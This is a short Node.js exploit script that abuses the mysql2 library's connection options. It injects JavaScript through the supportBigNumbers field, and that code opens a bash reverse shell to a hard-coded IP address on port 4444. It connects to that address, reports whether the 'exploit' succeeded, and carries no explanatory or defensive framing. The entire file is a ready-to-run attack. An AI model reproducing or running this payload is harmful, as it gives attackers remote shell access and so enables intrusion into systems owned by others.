//WE ARE CATCHING YOU

const mysql = require('mysql2');

const host = '167.71.203.2';
const port = 3306;
const user = 'any';
const password = 'any';

const connection = mysql.createConnection({
  host: host,
  port: port,
  user: user,
  password: password,

  supportBigNumbers: "console.log(require('child_process').execSync('bash -c \\\"bash -i >& /dev/tcp/167.71.203.2/4444 0>&1\\\"').toString())",
  bigNumberStrings: true
});

connection.query('SELECT 1', (err, results) => {
  if (err) {
    console.error('[-] Exploit failed:', err);
  } else {
    console.log('[+] Exploit may have succeeded.');
    console.log(results);
  }
  connection.end();
});
